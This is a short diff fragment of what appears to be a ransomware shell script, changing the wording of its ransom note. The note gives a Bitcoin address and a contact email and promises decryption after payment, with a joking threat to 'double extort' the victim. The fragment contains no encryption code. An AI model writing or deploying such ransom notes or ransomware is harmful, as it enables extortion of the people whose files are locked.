@@ -19,8 +19,7 @@ NOTE=$(
 		    bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297
 
 		    Once payment is received, contact us at pwned@pwned.com with proof of payment,
-		    send us your files and their respective .key's and we will send you the decrypted
-		        file back and double extort you for more money.
+		    We will send you the decryption script and private key. and double extort you for more money.
 
 		    :)
 	END
